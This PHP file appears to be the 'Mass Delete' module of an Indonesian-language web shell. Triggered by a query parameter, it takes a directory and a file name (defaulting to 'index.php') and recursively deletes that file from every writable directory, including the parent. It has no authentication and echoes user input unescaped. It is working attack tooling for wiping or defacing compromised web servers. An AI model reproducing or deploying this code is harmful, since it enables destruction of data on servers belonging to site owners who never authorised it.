<?php 
        //mass delete
        if ($_GET['aksi'] == "massdel") {
            function hapus_massal($dir, $namafile)
            {
                if (is_writable($dir)) {
                    $dira = scandir($dir);
                    foreach ($dira as $dirb) {
                        $dirc = "$dir/$dirb";
                        $lokasi = $dirc . '/' . $namafile;
                        if ($dirb === '.') {
                            if (file_exists("$dir/$namafile")) {
                                unlink("$dir/$namafile");
                            }
                        } elseif ($dirb === '..') {
                            if (file_exists("" . dirname($dir) . "/$namafile")) {
                                unlink("" . dirname($dir) . "/$namafile");
                            }
                        } else {
                            if (is_dir($dirc)) {
                                if (is_writable($dirc)) {
                                    if ($lokasi) {
                                        echo "$lokasi > Terhapus\n";
                                        unlink($lokasi);
                                        $massdel = hapus_massal($dirc, $namafile);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if ($_POST['start']) {
                echo "<textarea class='form-control' rows='8' disabled='disabled'>";
                hapus_massal($_POST['d_dir'], $_POST['d_file']);
                echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
            } else {
                echo "<center><p>{ Mass Delete }</p></center>
                <form method='post'>
                <p><i class='fa fa-folder'></i> Lokasi</p>
                <input type='text' name='d_dir' value='$dir' class='form-control'><br>
                <p><i class ='fa fa-file'></i> Nama File</p>
                <input type='text' name='d_file' placeholder='index.php' class='form-control'><br>
                <input type='submit' name='start' value='Hapus' class='btn btn-danger form-control'>
                <br><br>
                </form>";
            }
        }

?>
